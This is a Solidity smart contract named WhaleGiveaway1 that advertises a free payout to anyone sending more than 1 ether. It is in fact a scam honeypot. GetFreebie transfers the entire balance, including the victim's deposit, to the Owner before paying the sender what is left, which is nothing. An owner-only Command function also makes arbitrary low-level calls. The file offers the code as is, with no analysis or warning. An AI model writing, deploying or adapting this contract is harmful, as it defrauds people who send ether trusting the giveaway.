pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public Owner = msg.sender;

    function() public payable {}

    function GetFreebie() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        bool success;
        bytes4 sig = bytes4(keccak256("doSomething()"));
        assembly {
            success := call(sub(gas, 5000), adr, 0, add(data, 0x20), mload(data), 0, 0)
        }
        require(success);
    }
}